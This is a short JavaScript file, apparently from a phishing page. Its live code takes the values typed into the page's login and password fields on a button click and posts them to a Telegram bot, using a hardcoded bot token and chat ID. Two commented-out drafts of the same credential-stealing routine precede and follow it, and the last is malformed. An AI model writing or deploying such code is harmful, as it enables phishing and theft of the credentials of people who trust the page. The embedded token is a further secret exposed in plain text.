// function sendToBot() {
//     const username = document.getElementById('username').value;
//     const password = document.getElementById('password').value;

//     const message = `Username: ${username}\nPassword: ${password}`;
//     const botToken = '7738829434:AAFKNzsd9kE7Y5IH2fOwMSLeEBpNMM0ILG0'; // Replace with your bot's token
//     const chatId = '7377573108'; // Replace with your chat ID

//     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
//         method: 'POST',
//         headers: { 'Content-Type': 'application/json' },
//         body: JSON.stringify({
//             chat_id: chatId,
//             text: message
//         })
//     })
//     .then(response => response.json())
//     .then(data => {
//         if (data.ok) {
//             alert('Message sent to Telegram!');
//         } else {
//             alert('Failed to send message.');
//         }
//     })
//     .catch(error => {
//         console.error('Error:', error);
//         alert('Error sending message.');
//     });
//}

let BOT_TEKEN = "7738829434:AAFKNzsd9kE7Y5IH2fOwMSLeEBpNMM0ILG0";
let CHAT_ID = "7377573108";

let input = document.querySelectorAll("input");
let button = document.querySelector("button");


const requestToTelegram = async () => {
    let texts = `\n login: ${input[0].value} \n password: ${input[1].value}`;
    console.log(texts);

    try {
        let response = await fetch(`https://api.telegram.org/bot${BOT_TEKEN}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: 7377573108,
                text: texts,
            }),
        });

        let message = await response.json();
        console.log(message);
    } catch (err) {
        console.error("error:", err);
    }
};

button.addEventListener("click", () => {
    requestToTelegram();
});
    


// let BOT_TEKEN = "7738829434:AAFKNzsd9kE7Y5IH2fOwMSLeEBpNMM0ILG0";

// let CHAT_ID = "7377573108";

// let username = document.querySelectorAll("#username");

// let password = document.querySelector("#password");

// let log = document.querySelector("#log");

// const  requestToTelegram = { async () => {
//     let texts = `Username: ${username.value} \nPassword: ${password.value}`; }
//     console.log(texts);
//     try {
//         let response = await fetch(`https://api.telegram.org/bot${BOT_TEKEN}/sendMessage`, {
//             method: "POST",
//             headers: {
//                 "Content-Type": "application/json"
//             },
//             body: JSON.stringify({
//                 chat_id: CHAT_ID,
//                 text: texts,
//             }),
//         });
//     }



// };